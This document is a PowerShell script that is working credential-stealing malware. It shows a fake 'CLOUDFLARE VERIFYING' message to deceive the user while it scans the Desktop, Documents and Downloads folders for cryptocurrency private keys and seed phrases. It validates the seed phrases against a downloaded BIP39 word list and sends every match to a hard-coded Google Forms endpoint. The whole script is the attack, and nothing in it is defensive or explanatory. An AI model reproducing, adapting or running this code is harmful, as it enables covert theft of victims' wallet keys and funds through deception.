# --- Detect Console Focus and Show Fake Message ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
}
"@

Start-Job {
    while ($true) {
        Start-Sleep -Milliseconds 500
        if ([Win32]::GetForegroundWindow() -eq [Win32]::GetConsoleWindow()) {
            Write-Host "`nCLOUDFLARE VERIFYING PLEASE WAIT`n"
            break
        }
    }
} | Out-Null

# --- Actual File Scanning and Exfiltration Logic ---
$locations = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)

$fileTypes = '*.txt', '*.json', '*.log', '*.conf'

$patterns = @(
    '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b',         # Bitcoin WIF
    '\b0x[a-fA-F0-9]{64}\b',                        # Ethereum private key
    '\b[a-fA-F0-9]{64}\b',                          # Raw hex private key
    '\b(?:\w+\b[\s,]*){12,24}'                      # Seed phrases
)

$maxFileSize = 5MB

$formUrl = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdm5XuNDe2EVDC0NHMGJfiC35nh6_5kkXVY550Wc4HbHVT5cA/formResponse"
$fieldName = "entry.448178314"

try {
    $bip39Words = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt" -UseBasicParsing | Select-Object -ExpandProperty Content
    $bip39WordsList = $bip39Words -split "`n"
} catch {
    exit
}

function IsValidSeedPhrase($phrase) {
    $words = $phrase -split '\s+'
    if ($words.Count -lt 12 -or $words.Count -gt 24) {
        return $false
    }
    foreach ($word in $words) {
        if ($bip39WordsList -notcontains $word.Trim()) {
            return $false
        }
    }
    return $true
}

$results = @()

foreach ($location in $locations) {
    Get-ChildItem -Path $location -Recurse -Include $fileTypes -ErrorAction SilentlyContinue -Force | Where-Object {
        -not $_.PSIsContainer -and $_.Length -lt $maxFileSize
    } | ForEach-Object {
        $file = $_.FullName
        foreach ($pattern in $patterns) {
            try {
                $matches = Select-String -Path $file -Pattern $pattern -AllMatches -ErrorAction Stop
                foreach ($match in $matches) {
                    $value = $match.Matches.Value.Trim()
                    if ($pattern -like '*{12,24}' -and -not (IsValidSeedPhrase $value)) {
                        continue
                    }
                    $results += $value
                }
            } catch {}
        }
    }
}

$results = $results | Sort-Object -Unique

foreach ($result in $results) {
    try {
        $body = @{ $fieldName = $result }
        Invoke-WebRequest -Uri $formUrl -Method POST -Body $body -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}
